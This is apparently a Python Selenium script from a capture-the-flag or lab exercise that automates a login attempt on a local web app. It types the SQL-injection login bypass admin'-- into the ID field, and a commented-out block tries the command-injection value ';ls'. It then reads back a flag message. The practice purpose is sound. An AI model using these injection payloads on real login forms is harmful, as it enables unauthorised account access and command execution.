#selenium에서 웹브라우저 실행하고 특정 url로 이동하는데 사용하기 위해 사용.
from selenium import webdriver
# Selenium에서 특정 조건이 만족될 때까지 대기하는 기능 사용.
from selenium.webdriver.support.ui import WebDriverWait
#요소가 클릭 가능해질 때까지 기다리는 기능을 사용하기 위해 EC를 사용.
from selenium.webdriver.support import expected_conditions as EC
#ID, 이름, 클래스 이름, 태그 이름, CSS 셀렉터, XPath 등으로 찾을 수 있도록하기 위해 사용.
from selenium.webdriver.common.by import By
#Selenium을 사용하여 가져온 웹 페이지의 HTML 소스를 BeautifulSoup을 통해 파싱하고, 필요한 데이터를 쉽게 추출할 수 있어서 사용.
from bs4 import BeautifulSoup

# 크롬 드라이버 옵션 설정
options = webdriver.ChromeOptions()
##options.add_argument('--headless')  # 창을 띄우지 않음
options.add_argument('--no-sandbox') #샌드박스 비활성화. 안정적으로 실행되게 해줌.
options.add_argument('--disable-dev-shm-usage')#크롬의 /dev/shm 메모리를 사용하지 않도록 함. 더 효육적인 메모리 사용 가능.

# 크롬 드라이버 시작
driver = webdriver.Chrome(options=options)

try:
    # 웹 페이지로 이동
    url = 'http://127.0.0.1:3000/users/login'  # 웹 페이지 로그인 URL
    driver.get(url) #해당 url로 브라우저 이동.
    
    inputs = WebDriverWait(driver, 10).until(
    EC.presence_of_all_elements_located((By.CSS_SELECTOR, 'input'))
    )
    id_input = None
    pw_input = None

    for input_elem in inputs:
        placeholder = input_elem.get_attribute("placeholder")
        #print(f"[DEBUG] placeholder: '{placeholder}'")
        if "아이디(학번)를 입력해주세요" in placeholder:
            id_input = input_elem
        elif "비밀번호를 입력해주세요" in placeholder:
            pw_input = input_elem

    if not id_input or not pw_input:
        raise Exception("아이디 또는 비밀번호 입력창을 찾을 수 없습니다.")

     # 입력창 클릭 후 send_keys로 입력 (이벤트 발생 보장)
    id_input.click()
    id_input.clear()
    id_input.send_keys("admin'--")  # ← 여기에 실제 아이디 입력

    pw_input.click()
    pw_input.clear()
    pw_input.send_keys("1234")  

    '''
    # 자바스크립트를 사용하여 검색어 입력
    driver.execute_script("arguments[0].value = arguments[1];", id_input, ';ls') #command injection 시도.
    driver.execute_script("arguments[0].value = arguments[1];", pw_input, '1234')
    #위 코드로만 했더니 로그인 버튼이 비활성되는 이슈 발생.
    ''' 

    # 버튼 클릭 가능할 때까지 대기
    login_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((By.XPATH, '//*[@id="root"]/div/main/div/div/div/div/form/button'))
    )

    # 클릭
    driver.execute_script("arguments[0].click();", login_button)  # JS 방식 클릭

    # 결과 대기 및 출력
    flag_message = WebDriverWait(driver, 10).until(
        EC.visibility_of_element_located((By.XPATH, '//*[@id="root"]/div/main/div/div/div/div/form/p'))
    )
    print(flag_message.text)


finally:
    # 웹 드라이버 종료
    driver.quit()


